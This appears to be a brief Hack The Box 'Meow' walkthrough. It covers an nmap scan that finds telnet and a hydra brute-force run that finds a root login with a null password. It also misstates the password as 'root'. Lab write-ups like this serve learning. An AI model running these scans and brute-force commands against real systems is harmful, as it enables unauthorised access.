## MEOW Hackthebox
#### Room Description:
basic room. all you have to do is to scan. find open port. use the relative service to login. get the flag. done.
- Requirements:
  - networking
  - linux
  - nmap
  - hydra (optional)

----
#### First step: `network scan`

First thing I do with any room is to scan the IP address and look for the open ports and the services they are running.
```bash
# nmap command:
nmap -A -sV --privileged -T4 10.129.1.17 -p- -O -sC -v
```
|PORT|STATE|SERVICE|VERSION|
|----|----|----|----|
|23/tcp|**OPEN**|*telnet*|Linux telnetd|

----

#### Getting into the machine
in this phase, I will try to get into the machine that I have already scanned. Since this is a very basic machine so I didn't do any farther research to exploit. I just got into the `telnet` and try to get into. 

but the server is protected with credential.
> HTB gave us a hint that there is a user with null password. so I will try to bruteforse the user name with **Hydra**

```bash
# hydra command
hydra -L /usr/share/wordlists/rockyou.txt -e n 10.129.1.17 telnet

[23][telnet] host: 10.129.1.17   login: root
```
> The password is `root`

Now just get the flag.

it's in the root directory.

